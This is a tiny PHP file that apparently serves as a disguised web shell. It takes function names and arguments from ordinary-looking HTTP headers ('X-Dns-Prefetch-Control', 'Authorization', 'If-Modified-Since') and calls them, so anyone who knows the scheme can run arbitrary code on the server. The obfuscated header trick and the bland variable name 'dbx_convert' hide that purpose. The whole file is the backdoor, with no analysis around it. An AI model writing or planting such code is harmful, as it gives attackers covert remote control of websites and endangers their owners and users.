<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $dbx_convert = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Authorization']($_HEADERS['If-Modified-Since']));
    $dbx_convert();
}